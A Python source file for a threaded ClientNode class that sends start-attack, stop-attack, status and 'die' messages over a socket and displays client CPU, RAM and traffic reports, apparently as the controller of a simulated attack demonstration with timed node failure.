from threading import Thread, Timer
from Messages import StartAttackMessage, StopAttackMessage, ClientStatus, GetStatus, DieMessage
import json
from uiControl.InfoWindowControl import InfoWindowControl
import random

STATUS = ['offline', 'online', 'attacked', 'down']


class ClientNode(Thread):
    def __init__(self, connection):
        super().__init__()

        self.address = None
        self.status = STATUS[0]
        self.client_status = ClientStatus()
        self.info_window = InfoWindowControl()

        self.__running = True
        self.connection = connection

        self.die_timer = None

    def run(self) -> None:
        self.status = STATUS[1]
        while self.__running:
            data = self.connection.recv(20480).decode("UTF8")
            if len(data):
                self.on_msg_event(json.loads(data))

    def on_msg_event(self, data):
        print("i: {}".format(data))
        if 't' in data:
            if data['t'] == ClientStatus.tag:
                self.client_status = ClientStatus.decode(data)
                self.info_window.set_info(self.client_status.CPU,
                                          self.client_status.RAM,
                                          self.client_status.Connects,
                                          self.client_status.Traffic)
                self.info_window.show()

    def set_status(self, int_code):
        if 0 <= int_code <= len(STATUS):
            self.status = STATUS[int_code]

    def set_address(self, address):
        self.address = address

    def stop(self):
        self.__running = False
        self.status = STATUS[0]
        self.connection.close()

    def start_attack(self):
        if self.status not in [STATUS[0], STATUS[3]]:
            self.send_message(StartAttackMessage().get_message())
            self.status = STATUS[2]
            self.die_timer = Timer(random.uniform(50, 120), self.die_message)
            self.die_timer.start()

    def stop_attack(self):
        if self.status not in [STATUS[0], STATUS[3]]:
            self.send_message(StopAttackMessage().get_message())
            self.status = STATUS[1]
            self.die_timer.cancel()

    def die_message(self):
        self.send_message(DieMessage().get_message())
        self.status = STATUS[3]

    def get_node_info(self):
        print("[{}] ask info".format(self.address))
        self.send_message(GetStatus().get_message())

    def send_message(self, message):
        print("o: {}".format(message))
        self.connection.send(message)
